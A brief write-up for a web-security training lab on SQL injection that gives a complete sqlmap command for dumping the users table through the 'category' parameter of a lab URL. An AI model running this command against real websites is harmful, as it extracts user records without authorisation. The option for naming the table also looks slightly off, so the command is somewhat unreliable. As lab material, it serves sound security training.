# Lab 18: SQL Injection with SQLMap

* **Solution**: Use SQLMap to automate dumping the users table via the category parameter, leveraging its detection and extraction capabilities.
* **Final Payload**:
  * Command: sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts" --dump --table users (adjust URL to your lab instance)